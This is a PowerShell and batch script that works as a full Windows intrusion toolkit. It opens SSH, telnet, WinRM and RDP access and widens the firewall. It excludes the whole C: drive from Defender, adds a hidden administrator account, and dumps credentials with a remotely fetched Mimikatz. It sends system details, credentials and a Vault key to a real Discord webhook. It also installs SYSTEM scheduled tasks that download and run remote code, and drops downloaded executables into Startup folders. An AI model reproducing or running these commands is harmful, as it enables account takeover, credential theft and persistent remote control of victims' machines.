dism /online /Enable-Feature /FeatureName:TelnetClient

Enable-WindowsOptionalFeature -Online -FeatureName TelnetClient



Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0  

Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22

Set-Service -Name sshd -StartupType 'Automatic'

Start-Service sshd



Set-NetFirewallProfile -All -Enabled True

Enable-NetFirewallRule -Name FPS-ICMP4-ERQ-In

New-NetFirewallRule -DisplayName "Allow inbound ICMPv4" -Direction Inbound -Protocol ICMPv4 -IcmpType 8 -Action Allow

netsh advfirewall firewall add rule name="ICMP Allow incoming V4 echo request" protocol=icmpv4:8,any dir=in action=allow

netsh advfirewall firewall add rule name="All ICMP V4" protocol=icmpv4:any,any dir=in action=allow



Import-Module NetSecurity

Set-ExecutionPolicy RemoteSigned -Force

Set-NetConnectionProfile -NetworkCategory Private

Enable-PSRemoting -force

Set-Service WinRM -StartMode Automatic

Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}

Set-Item WSMan:localhost\client\trustedhosts -value * -force

Get-Item WSMan:\localhost\Client\TrustedHosts

Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True -Profile Any



netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
netsh advfirewall firewall add rule name="Open Port 22" dir=in protocol=TCP localport=22 action=allow
netsh advfirewall firewall add rule name="Open Port 23" dir=in protocol=TCP localport=23 action=allow
netsh advfirewall firewall add rule name="Open Port 5986" dir=in protocol=TCP localport=5986 action=allow
netsh advfirewall firewall add rule name="Open Port 5985" dir=in protocol=TCP localport=5985 action=allow
netsh advfirewall firewall add rule name="Open Port 80" dir=in protocol=TCP localport=80 action=allow
netsh advfirewall firewall add rule name="Open Port 445" dir=in protocol=TCP localport=445 action=allow
netsh advfirewall firewall add rule name="Open Port 443" dir=in protocol=TCP localport=443 action=allow


netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=out protocol=TCP localport=3389 action=allow
netsh advfirewall firewall add rule name="Open Port 22" dir=out protocol=TCP localport=22 action=allow
netsh advfirewall firewall add rule name="Open Port 23" dir=out protocol=TCP localport=23 action=allow
netsh advfirewall firewall add rule name="Open Port 5986" dir=out protocol=TCP localport=5986 action=allow
netsh advfirewall firewall add rule name="Open Port 5985" dir=out protocol=TCP localport=5985 action=allow
netsh advfirewall firewall add rule name="Open Port 80" dir=out protocol=TCP localport=80 action=allow
netsh advfirewall firewall add rule name="Open Port 445" dir=out protocol=TCP localport=445 action=allow
netsh advfirewall firewall add rule name="Open Port 443" dir=out protocol=TCP localport=443 action=allow




Add-MpPreference -ExclusionPath "C:\"

net user Boot$ reboot /add

net localgroup "Remote Desktop Users" /add

net localgroup "Remote Desktop Users" Boot$ /add

net localgroup Administrators Boot$ /add

net localgroup Administrateurs Boot$ /add

net localgroup Administradores Boot$ /add

net localgroup Administrator Boot$ /add

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v Boot$ /t REG_DWORD /d 0 /f

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0

Get-NetFirewallRule -DisplayName "Remote Desktop*" | Select DisplayName, Enabled

Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled true

Enable-NetFirewallRule -DisplayGroup "Remote Desktop*"

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1

New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Force | Out-Null
    
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value "00000000" -PropertyType DWORD -Force









$webhookUri = 'https://discord.com/api/webhooks/1041106495577800745/nPYCrAr5AKaEl52WGSnfB3pCtk-QW4Rx9vlmQWIL5LTugQjnvggw35xIdGfXfCx3i01y'

$info = Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress; hostname 
$info2 = whoami
$info3 = hostname
$info4 = (Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue | Select-Object -Property PSComputerName, SystemType, TotalPhysicalMemory, UserName, Manufacturer, HypervisorPresent)
$info5 = curl https://ipinfo.io/ip
$info6 = curl ifconfig.me
$info7 = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
$info8 = Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress
$info9 = Get-LocalUser



$Body = @{
   'username' = 'Spidey Bot'
   'content' = $info + '          ' + $info2 + '          ' + $info3 + '          ' + $info4 + '          ' + $info5 + '          ' + $info6 + '          ' + $info7 + '          ' + $info8 + '          ' + $info9
   }


Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body











IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds | Out-File -FilePath $env:Temp\id.txt

select-string -path $env:Temp\id.txt -pattern NTLM, Password, "User Name", Domain, Username > $env:Temp\id2.txt

$mytext = Get-Content $env:Temp\id2.txt

$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($mytext)) > $env:Temp\idbs64.txt

Get-Content $env:Temp\idbs64.txt

$s = Get-Content $env:Temp\idbs64.txt

$ms = New-Object System.IO.MemoryStream
$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
$sw = New-Object System.IO.StreamWriter($cs)
$sw.Write($s)
$sw.Close();
$d = [System.Convert]::ToBase64String($ms.ToArray())



#Insert your webhook here
$webhookUri = 'https://discord.com/api/webhooks/1041106495577800745/nPYCrAr5AKaEl52WGSnfB3pCtk-QW4Rx9vlmQWIL5LTugQjnvggw35xIdGfXfCx3i01y'

$id = $d

#Creating the body of your message
    $Body = @{
   'username' = 'Spidey Bot'
   'content' = $id
   }
#Send your data using REST method
    Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body





Remove-Item $env:Temp\id.txt -Recurse

Remove-Item $env:Temp\id2.txt -Recurse

Remove-Item $env:Temp\idbs64.txt -Recurse












$mytext2 = Get-Content $env:LOCALAPPDATA\Microsoft\Vault\key.txt

$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($mytext2)) > $env:LOCALAPPDATA\Microsoft\Vault\keybs64.txt

Get-Content $env:LOCALAPPDATA\Microsoft\Vault\keybs64.txt

$s = Get-Content $env:LOCALAPPDATA\Microsoft\Vault\keybs64.txt

$ms = New-Object System.IO.MemoryStream
$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
$sw = New-Object System.IO.StreamWriter($cs)
$sw.Write($s)
$sw.Close();
$d = [System.Convert]::ToBase64String($ms.ToArray())





#Insert your webhook here
$webhookUri = 'https://discord.com/api/webhooks/1041106495577800745/nPYCrAr5AKaEl52WGSnfB3pCtk-QW4Rx9vlmQWIL5LTugQjnvggw35xIdGfXfCx3i01y'

$key = $d
$text = echo KEY
$info = Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress; hostname 
$info2 = whoami
$info3 = hostname
$info4 = (Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue | Select-Object -Property PSComputerName, SystemType, TotalPhysicalMemory, UserName, Manufacturer, HypervisorPresent)
$info5 = curl https://ipinfo.io/ip
$info6 = curl ifconfig.me
$info7 = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
$info8 = Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress


#Creating the body of your message
    $Body = @{
   'username' = 'Spidey Bot'
   'content' = $text + '          ' + $key + '          ' + $info + '          ' + $info2 + '          ' + $info3 + '          ' + $info4 + '          ' + $info5 + '          ' + $info6 + '          ' + $info7 + '          ' + $info8 + '          ' + $info9
   }
#Send your data using REST method
    Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body












schtasks /create /tn WindowsDefenderMonitor /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -w h -ep b -c 'iex((iwr https://raw.githubusercontent.com/purmnr/LD/main/Task.ps1).content)'" /sc onstart /ru System

schtasks /create /tn TaskManager /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -w h -ep b -c 'iex((iwr https://raw.githubusercontent.com/purmnr/LD/main/Task.ps1).content)'" /sc onlogon /ru System

schtasks /create /tn CacheCleanup /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -w h -ep b -c 'iex((iwr https://raw.githubusercontent.com/purmnr/LD/main/Task.ps1).content)'" /sc onstart /ru System

schtasks /create /tn NotificationBarStatusUpdate /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -w h -ep b -c 'iex((iwr https://raw.githubusercontent.com/purmnr/LD/main/Task.ps1).content)'" /sc onlogon /ru System






Invoke-WebRequest -Uri 'https://www.4sync.com/web/directDownload/BD5l1m7p/ZHPcJKZd.efbb4d220a5eb9ba0c7de0b5c813a05b' -OutFile "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\1.exe";

Invoke-WebRequest -Uri 'https://www.4sync.com/web/directDownload/EPgmiqRe/ZHPcJKZd.777b0d594cefab4476ddc313e6692524' -OutFile "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\2.exe";

Invoke-WebRequest -Uri 'https://www.4sync.com/web/directDownload/KokDbH_s/ZHPcJKZd.2a4f9666ce3524e538e729a7a689a967' -OutFile "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\3.exe";

Invoke-WebRequest -Uri 'https://www.4sync.com/web/directDownload/ckiuGqTk/ZHPcJKZd.7458eb993d3785d65be5bf0adb295a08' -OutFile "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\4.exe";

Invoke-WebRequest -Uri 'https://www.4sync.com/web/directDownload/rEExfg-J/ZHPcJKZd.0ee0c0def85830525fa22f8aa5e4083d' -OutFile "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\5.exe";

Invoke-WebRequest -Uri 'https://www.4sync.com/web/directDownload/-THr5Q8W/ZHPcJKZd.9a74e7a32a7a247ffb451bb625589247' -OutFile "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\6.exe";

Invoke-WebRequest -Uri 'https://www.4sync.com/web/directDownload/VjDnWLRE/ZHPcJKZd.498b7c22c43c05d30265050f36b2b3d8' -OutFile "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Task.exe";




Invoke-WebRequest -Uri 'https://www.4sync.com/web/directDownload/L-sTnNZ1/ZHPcJKZd.56e91b4c30c2111bc2eff7e758019190' -OutFile "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\lg.exe";

Invoke-WebRequest -Uri 'https://www.4sync.com/web/directDownload/_5qKSwHT/ZHPcJKZd.3ea4fc18fd808715c9fd18f163b3ab14' -OutFile "$env:LOCALAPPDATA\Microsoft\Vault\key.exe";









Invoke-WebRequest -Uri 'https://www.4sync.com/web/directDownload/vv8g9K6r/ZHPcJKZd.4b61d446d7f0e756e7edba326c52383b' -OutFile $env:LOCALAPPDATA\Microsoft\Windows\Safety\edge\KATB.exe ;

cd $env:LOCALAPPDATA\Microsoft\Windows\Safety\edge;

.\KATB.exe;

Start-Sleep 10;

Remove-Item $env:LOCALAPPDATA\Microsoft\Windows\Safety\edge\KATB.exe -Recurse;
